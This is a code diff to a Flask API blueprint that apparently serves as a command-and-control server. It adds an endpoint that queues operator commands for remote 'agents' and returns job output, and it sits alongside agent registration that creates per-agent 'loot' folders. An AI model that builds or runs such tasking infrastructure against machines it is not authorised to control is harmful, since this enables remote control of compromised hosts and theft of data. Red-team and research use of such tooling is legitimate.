@@ -1,3 +1,8 @@
+"""
+Blueprint that contains all of the API endpoints used internally
+by users and externally by agents.
+"""
+
 import os
 from datetime import datetime
 
@@ -34,6 +39,43 @@ def register_agent():
             os.mkdir(f"loot/agent_{agent_id}")
             return str(agent_id)
         return "Bad Request"
+
+
+@api.route("/api/1.1/add_command", methods=["POST"])
+def add_command():
+    """API endpoint that allows the agent terminal to add
+    commands to the Command table in the database
+
+    :returns: a json RPC object containing any finished jobs and the new job ID
+    :rtype: dict
+    """
+    if request.method == "POST":
+        json = request.json
+        if json is None:
+            return {}
+        command = json["params"]
+        agent_id = json["method"].split("agent")[1]
+        new_comm = Command(agent_id=agent_id, command=command)
+        db.session.add(new_comm)
+        db.session.flush()
+        db.session.commit()
+        db.session.refresh(new_comm)
+        res = Command.query.filter(
+            Command.agent_id == agent_id,
+            Command.retrieved == True,
+            Command.displayed == False,
+        ).first()
+        output = f"[+] new job started with id {new_comm.command_id}"
+        if res is not None and res.output is not None:
+            res.displayed = True
+            output += f"\n[*] job with id {res.command_id} finished with output: \n{res.output}"
+            db.session.flush()
+            db.session.commit()
+        rpc = {}
+        rpc["result"] = output
+        rpc["jsonrpc"] = json["jsonrpc"]
+        rpc["id"] = json["id"]
+        return rpc
 
 
 @api.route("/api/1.1/get_command", methods=["POST"])
